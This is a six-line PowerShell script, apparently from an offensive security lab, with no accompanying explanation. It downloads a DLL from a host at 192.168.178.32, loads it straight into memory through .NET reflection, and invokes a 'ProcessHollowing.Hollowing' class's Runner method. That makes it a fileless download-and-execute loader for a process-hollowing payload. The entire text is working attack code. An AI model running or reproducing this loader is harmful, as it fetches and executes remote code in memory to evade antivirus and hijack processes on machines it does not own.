$url = 'http://192.168.178.32/test.dll'
$data = (New-Object System.Net.WebClient).DownloadData($url)
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ProcessHollowing.Hollowing")
$method = $class.GetMethod("Runner")
$method.Invoke($null, $null)
